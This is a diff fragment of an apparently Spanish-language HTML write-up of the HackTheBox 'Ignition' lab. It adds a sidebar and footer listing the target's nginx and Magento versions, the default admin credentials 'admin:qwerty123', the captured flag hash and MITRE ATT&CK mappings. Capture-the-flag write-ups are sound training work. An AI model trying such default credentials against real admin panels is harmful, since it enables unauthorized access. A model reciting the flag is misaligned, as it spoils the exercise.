+        <div class="glosario-item">
+          <div class="glosario-term">Fingerprinting</div>
+          <p class="glosario-def">Proceso de identificar tecnologías, versiones y configuraciones de un sistema objetivo analizando respuestas HTTP, rutas de recursos, metadatos y comportamientos específicos del software.</p>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- ── SIDEBAR ──────────────────────────────────── -->
+  <aside>
+    <div class="sidebar">
+
+      <!-- Target Info -->
+      <div class="sidebar-card">
+        <div class="sidebar-title">&#127919; Target Info</div>
+        <div class="info-row">
+          <span class="info-key">Máquina</span>
+          <span class="info-val">Ignition</span>
+        </div>
+        <div class="info-row">
+          <span class="info-key">Plataforma</span>
+          <span class="info-val">HackTheBox</span>
+        </div>
+        <div class="info-row">
+          <span class="info-key">Categoría</span>
+          <span class="info-val">Starting Point</span>
+        </div>
+        <div class="info-row">
+          <span class="info-key">Dificultad</span>
+          <span class="info-val" style="color:var(--green)">Very Easy</span>
+        </div>
+        <div class="info-row">
+          <span class="info-key">SO</span>
+          <span class="info-val">Linux</span>
+        </div>
+        <div class="info-row">
+          <span class="info-key">IP</span>
+          <span class="info-val" style="color:var(--orange)">10.129.1.27</span>
+        </div>
+        <div class="info-row">
+          <span class="info-key">Fecha</span>
+          <span class="info-val">2026-03-17</span>
+        </div>
+        <div class="info-row">
+          <span class="info-key">Tiempo</span>
+          <span class="info-val" style="color:var(--yellow)">~8 min</span>
+        </div>
+        <div class="info-row">
+          <span class="info-key">Web Server</span>
+          <span class="info-val">nginx 1.14.2</span>
+        </div>
+        <div class="info-row">
+          <span class="info-key">CMS</span>
+          <span class="info-val">Magento 2.x</span>
+        </div>
+        <div class="info-row">
+          <span class="info-key">Creds</span>
+          <span class="info-val" style="color:var(--purple)">admin:qwerty123</span>
+        </div>
+      </div>
+
+      <!-- Flag rápida -->
+      <div class="flag-sidebar">
+        <div class="flag-sidebar-lbl">&#127937; Flag Capturada</div>
+        <div class="flag-sidebar-val">797d6c988d9dc5865e010b9410f247e0</div>
+      </div>
+
+      <!-- Herramientas -->
+      <div class="sidebar-card">
+        <div class="sidebar-title">&#128295; Herramientas</div>
+        <div>
+          <span class="tool-chip">&#128270; nmap</span>
+          <span class="tool-chip">&#127760; curl</span>
+          <span class="tool-chip">&#128013; Python</span>
+          <span class="tool-chip">requests</span>
+          <span class="tool-chip">HTTPAdapter</span>
+          <span class="tool-chip">grep</span>
+        </div>
+      </div>
+
+      <!-- TOC -->
+      <div class="sidebar-card">
+        <div class="sidebar-title">&#128195; Tabla de Contenidos</div>
+        <a href="#descripcion" class="toc-link"><span class="toc-num">01</span>Descripción</a>
+        <a href="#recon"       class="toc-link"><span class="toc-num">02</span>Reconocimiento</a>
+        <a href="#vhost"       class="toc-link"><span class="toc-num">03</span>Virtual Host</a>
+        <a href="#fingerprint" class="toc-link"><span class="toc-num">04</span>Fingerprinting Magento</a>
+        <a href="#vulns"       class="toc-link"><span class="toc-num">05</span>Vulnerabilidades</a>
+        <a href="#timeline"    class="toc-link"><span class="toc-num">06</span>Timeline</a>
+        <a href="#exploit"     class="toc-link"><span class="toc-num">07</span>Explotación</a>
+        <a href="#falsopositivo" class="toc-link"><span class="toc-num">08</span>Falso Positivo</a>
+        <a href="#flag"        class="toc-link"><span class="toc-num">09</span>Flag</a>
+        <a href="#recs"        class="toc-link"><span class="toc-num">10</span>Recomendaciones</a>
+        <a href="#lecciones"   class="toc-link"><span class="toc-num">11</span>Lecciones</a>
+        <a href="#glosario"    class="toc-link"><span class="toc-num">12</span>Glosario</a>
+      </div>
+
+      <!-- MITRE ATT&CK -->
+      <div class="sidebar-card">
+        <div class="sidebar-title">&#128737; MITRE ATT&amp;CK</div>
+        <div class="mitre-item">
+          <div class="mitre-id">T1078.001</div>
+          <div class="mitre-name">Valid Accounts — Default Credentials. Uso de credenciales por defecto para acceso inicial al panel admin.</div>
+        </div>
+        <div class="mitre-item">
+          <div class="mitre-id">T1190</div>
+          <div class="mitre-name">Exploit Public-Facing Application. Abuso del panel de administración Magento expuesto públicamente.</div>
+        </div>
+        <div class="mitre-item">
+          <div class="mitre-id">T1083</div>
+          <div class="mitre-name">File and Directory Discovery. Enumeración del panel admin y estructura de rutas Magento para identificar superficies de ataque.</div>
+        </div>
+        <div class="mitre-item">
+          <div class="mitre-id">T1595.002</div>
+          <div class="mitre-name">Active Scanning — Vulnerability Scanning. Fingerprinting del CMS mediante análisis de rutas de assets estáticos.</div>
+        </div>
+      </div>
+
+      <!-- Puertos -->
+      <div class="sidebar-card">
+        <div class="sidebar-title">&#128246; Puertos Abiertos</div>
+        <table style="margin:0">
+          <thead>
+            <tr>
+              <th>Puerto</th>
+              <th>Servicio</th>
+              <th>Estado</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>80/tcp</code></td>
+              <td>HTTP nginx</td>
+              <td><span class="badge badge-green">Open</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+    </div>
+  </aside>
 </div>
 
-<script>
-  const canvas=document.getElementById('matrix');const ctx=canvas.getContext('2d');
-  canvas.width=window.innerWidth;canvas.height=window.innerHeight;
-  window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
-  const chars='アイウエオカキクケコ0123456789ABCDEF<>{}[]';const fontSize=14;
-  let cols=Math.floor(canvas.width/fontSize);let drops=Array(cols).fill(1);
-  function drawMatrix(){ctx.fillStyle='rgba(10,14,26,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#4ade80';ctx.font=fontSize+'px monospace';for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(char,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}}
-  setInterval(drawMatrix,35);
-</script>
+<!-- ═══════════════════════════════════════════════════════
+     FOOTER
+═══════════════════════════════════════════════════════ -->
+<footer>
+  <div class="footer-left">
+    Reporte generado por <strong>kali</strong> &mdash; HTB Ignition &mdash; Starting Point Very Easy
+    &mdash; 2026-03-17
+  </div>
+  <div class="footer-right">
+    flag: 797d6c988d9dc5865e010b9410f247e0 &nbsp;|&nbsp; nginx 1.14.2 + Magento &nbsp;|&nbsp; admin:qwerty123
+  </div>
+</footer>
+
 </body>
 </html>
